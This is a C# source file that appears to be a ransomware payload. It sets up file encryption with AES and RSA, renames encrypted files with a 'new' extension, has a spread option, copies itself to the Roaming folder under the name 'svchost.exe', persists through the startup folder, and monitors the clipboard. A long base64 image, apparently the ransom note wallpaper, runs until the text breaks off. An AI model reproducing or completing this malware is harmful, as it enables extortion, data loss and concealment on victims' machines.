using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ConsoleApplication7;

internal class Program
{
	public static class NativeMethods
	{
		public const int clp = 797;

		public static IntPtr intpreclp = new IntPtr(-3);

		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool AddClipboardFormatListener(IntPtr hwnd);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
	}

	private static readonly byte[] _salt = new byte[32];

	private static string userName = Environment.UserName;

	private static string userDir = "C:\\Users\\";

	public static string appMutexRun = "7z459ajrk722yn8c5j4fg";

	public static bool encryptionAesRsa = true;

	public static string encryptedFileExtension = "new";

	private static bool checkSpread = false;

	private static string spreadName = "surprise";

	private static bool checkCopyRoaming = true;

	private static string processName = "svchost.exe";

	public static string appMutexRun2 = "2X28tfRmWaPyPQgvoHV";

	private static bool checkStartupFolder = true;

	private static bool checkSleep = false;

	private static int sleepTextbox = 300;

	private static string base64Image = "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